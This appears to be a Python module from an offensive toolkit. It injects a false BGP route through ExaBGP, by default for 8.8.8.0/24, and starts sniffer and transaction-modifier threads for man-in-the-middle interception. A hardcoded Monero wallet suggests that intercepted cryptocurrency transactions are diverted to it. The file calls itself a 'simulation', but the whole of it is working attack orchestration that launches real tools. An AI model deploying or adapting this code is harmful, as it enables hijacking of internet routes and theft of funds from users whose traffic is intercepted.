#!/usr/bin/env python3
"""
bgp_hijack_high.py - High-level BGP hijacking MITM simulation
"""

import subprocess
import time
import os
import sys
import json
import threading
from pathlib import Path
from .utils import setup_logging, log_transaction, log_modification

logger = setup_logging("bgp_hijack_high")

BASE_DIR = Path(__file__).resolve().parent.parent.parent.parent
CONFIG_FILE = BASE_DIR / "config.json"

class BGP_Hijack_High:
    def __init__(self):
        self.running = False
        self.processes = []
        self.load_config()
    
    def load_config(self):
        if CONFIG_FILE.exists():
            with open(CONFIG_FILE, "r") as f:
                config = json.load(f)
                self.target_prefix = config.get("bgp_mitm", {}).get("target_prefix", "8.8.8.0/24")
                self.next_hop = config.get("bgp_mitm", {}).get("next_hop", "10.0.0.1")
                self.interface = config.get("bgp_mitm", {}).get("interface", "eth0")
                self.test_wallet = config.get("bgp_mitm", {}).get("test_wallet", "47SuVgVRZkQaVW3TauHdKCKVB7ynhtWzsARE9tesy2mYQrKSg2ErUibcx8okZFPkxYbVcsBCZsK1HAH3mci4uNA198NCpTG")
                self.wallet_type = config.get("bgp_mitm", {}).get("wallet_type", "monero")
        else:
            self.target_prefix = "8.8.8.0/24"
            self.next_hop = "10.0.0.1"
            self.interface = "eth0"
            self.test_wallet = "47SuVgVRZkQaVW3TauHdKCKVB7ynhtWzsARE9tesy2mYQrKSg2ErUibcx8okZFPkxYbVcsBCZsK1HAH3mci4uNA198NCpTG"
            self.wallet_type = "monero"
    
    def inject_bgp_route(self):
        logger.info(f"[+] Injecting false BGP route: {self.target_prefix} -> {self.next_hop}")
        try:
            exabgp_conf = f"""
neighbor 10.0.0.1 {{
    router-id 10.0.0.2;
    local-as 65001;
    peer-as 65000;
    static {{
        route {self.target_prefix} next-hop {self.next_hop};
    }}
}}
"""
            with open("/tmp/exabgp_hijack.conf", "w") as f:
                f.write(exabgp_conf)
            process = subprocess.Popen(
                ["exabgp", "/tmp/exabgp_hijack.conf"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.processes.append(process)
            logger.info("[+] ExaBGP process started")
            return True
        except Exception as e:
            logger.error(f"ExaBGP injection failed: {e}")
            return False
    
    def start_mitm(self):
        logger.info("[+] Starting MITM interception...")
        from .packet_sniffer import start_sniffer
        from .transaction_modifier import start_modifier
        sniffer_thread = threading.Thread(
            target=start_sniffer,
            args=(self.interface, None),
            daemon=True
        )
        sniffer_thread.start()
        self.processes.append(sniffer_thread)
        modifier_thread = threading.Thread(
            target=start_modifier,
            args=(self.interface,),
            daemon=True
        )
        modifier_thread.start()
        self.processes.append(modifier_thread)
        logger.info("[+] MITM interception started")
        return True
    
    def run_full_hijack(self):
        logger.info("=" * 60)
        logger.info("BGP HIJACK - HIGH LEVEL SIMULATION")
        logger.info(f"Target Prefix: {self.target_prefix}")
        logger.info(f"Next Hop: {self.next_hop}")
        logger.info(f"Interface: {self.interface}")
        logger.info(f"Wallet Type: {self.wallet_type}")
        logger.info(f"Wallet: {self.test_wallet[:20]}...")
        logger.info("=" * 60)
        if not self.inject_bgp_route():
            logger.error("[!] BGP injection failed")
            return {"status": "failed", "error": "BGP injection failed"}
        time.sleep(2)
        if not self.start_mitm():
            logger.error("[!] MITM interception failed")
            return {"status": "failed", "error": "MITM failed"}
        self.running = True
        logger.info("[+] BGP hijack simulation running. Press Ctrl+C to stop.")
        return {"status": "running", "target": self.target_prefix}
    
    def stop_hijack(self):
        logger.info("[+] Stopping BGP hijack simulation...")
        for p in self.processes:
            try:
                p.terminate()
            except:
                pass
        self.running = False
        self.processes = []
        logger.info("[+] Simulation stopped")
        return {"status": "stopped"}

_hijack_instance = None

def get_hijack_instance():
    global _hijack_instance
    if _hijack_instance is None:
        _hijack_instance = BGP_Hijack_High()
    return _hijack_instance

def run_high_hijack():
    hijack = get_hijack_instance()
    return hijack.run_full_hijack()

def stop_high_hijack():
    hijack = get_hijack_instance()
    return hijack.stop_hijack()